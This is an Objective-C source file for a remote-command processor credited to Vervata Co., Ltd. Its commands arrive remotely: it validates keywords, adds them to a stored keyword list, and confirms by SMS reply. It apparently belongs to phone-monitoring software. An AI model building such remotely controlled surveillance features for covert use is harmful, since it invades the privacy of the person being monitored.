
/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  AddKeywordProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  13/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "AddKeywordProcessor.h"
#import "PrefKeyword.h"
#import "Preference.h"

@interface AddKeywordProcessor (PrivateAPI)
- (void) processAddKeywords;
- (void) addKeywordsException: (NSUInteger) aErrorCode;
- (void) sendReplySMS;
- (BOOL) canAddKeywords;
- (BOOL) checkIfKeywordsAlreadyExist;
@end

@implementation AddKeywordProcessor

@synthesize mKeywordList;

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the AddKeywordProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (AddKeywordProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"AddKeywordProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor PrivateAPI Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the AddKeywordProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"AddKeywordProcessor--->doProcessingCommand")
	
	if ([RemoteCmdProcessorUtils isContainNonEndArgument:[mRemoteCmdData mArguments]]) {
		
		[self setMKeywordList:[RemoteCmdProcessorUtils validateArgs:[mRemoteCmdData mArguments] validationType:kKeywordValidation]];
		DLog(@"AddKeywordProcessor--->Keywords:%@",mKeywordList);
		if ([mKeywordList count]>0) {
			if ([self canAddKeywords]) { 
				if (![self checkIfKeywordsAlreadyExist] &&
					![RemoteCmdProcessorUtils isDuplicateString:mKeywordList])  [self processAddKeywords];
				else [self addKeywordsException:kCmdExceptionErrorCannotAddDuplicateToKeywordList];
			}
			else {
				[self addKeywordsException:kCmdExceptionErrorKeywordExceedListCapacity];
			}
		}
		else {
			[self addKeywordsException:kCmdExceptionErrorInvalidKeywordToKeywordList];
		}
	} else {
		[self addKeywordsException:kCmdExceptionErrorInvalidCmdFormat];
	}	
}

#pragma mark AddKeywordProcessor PrivateAPI Methods

/**
 - Method name: processAddKeywords
 - Purpose:This method is used to process Add keywords
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) processAddKeywords {
	DLog (@"AddKeywordProcessor--->processAddKeywords");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefKeyword *prefKeyword = (PrefKeyword *) [prefManager preference:kKeyword];
	NSMutableArray *keywordList=[[NSMutableArray alloc] init];
	
	// Existing keywords
	for (NSString *keyword in [prefKeyword mKeywords]) {
		[keywordList addObject:keyword];
	}
	//New keywords 
	for (NSString *keyword in mKeywordList) {
		[keywordList addObject:keyword];
	}
	
	[prefKeyword setMKeywords:keywordList];
	[prefManager savePreferenceAndNotifyChange:prefKeyword];
	[keywordList release];
	[self sendReplySMS];
}

/**
 - Method name: canAddKeywords
 - Purpose:This method is used to check exceed keywordlist capacity. 
 - Argument list and description: No Argument
 - Return description: BOOL
*/

- (BOOL) canAddKeywords {
	DLog (@"AddKeywordProcessor--->canAddKeywords");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefKeyword *prefKeyword = (PrefKeyword *) [prefManager preference:kKeyword];
	int count=[[prefKeyword mKeywords] count]+[mKeywordList count];
	if (count<=KEYWORD_LIST_CAPACITY) {
		return YES;
	}
	else {
		return NO;
	}
}

/**
 - Method name: checkIfKeywordsAlreadyExist
 - Purpose:This method is used to check if keyword already exist. 
 - Argument list and description: No Argument
 - Return description: BOOL
*/

- (BOOL) checkIfKeywordsAlreadyExist {
	DLog (@"AddKeywordProcessor--->checkIfKeywordsAlreadyExist");
	BOOL isKeywordExist=NO;
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefKeyword *prefKeyword = (PrefKeyword *) [prefManager preference:kKeyword];
	for (NSString *keyword in mKeywordList) {
		NSPredicate *predicate = [NSPredicate predicateWithFormat:@"SELF == %@",keyword];
		NSArray *result=[[prefKeyword mKeywords] filteredArrayUsingPredicate:predicate];
		if ([result count]) {
			isKeywordExist=YES;
			break;
		}
	}
	return isKeywordExist;
}

/**
 - Method name: addKeywordsException
 - Purpose:This method is invoked add keyword process is failed. 
 - Argument list and description: No Argument
 - Return description:No return type
*/

- (void) addKeywordsException: (NSUInteger) aErrorCode {
	DLog (@"AddKeywordProcessor--->addKeywordsException")
	FxException* exception = [FxException exceptionWithName:@"addKeywordsException" andReason:@"Add keywords error"];
	[exception setErrorCode:aErrorCode];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description:No Argument
 - Return description: No return type
*/

- (void) sendReplySMS {
	DLog (@"AddKeywordProcessor--->sendReplySMS");
	
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:messageFormat];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:messageFormat];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[mKeywordList release];
	[super dealloc];
}


@end
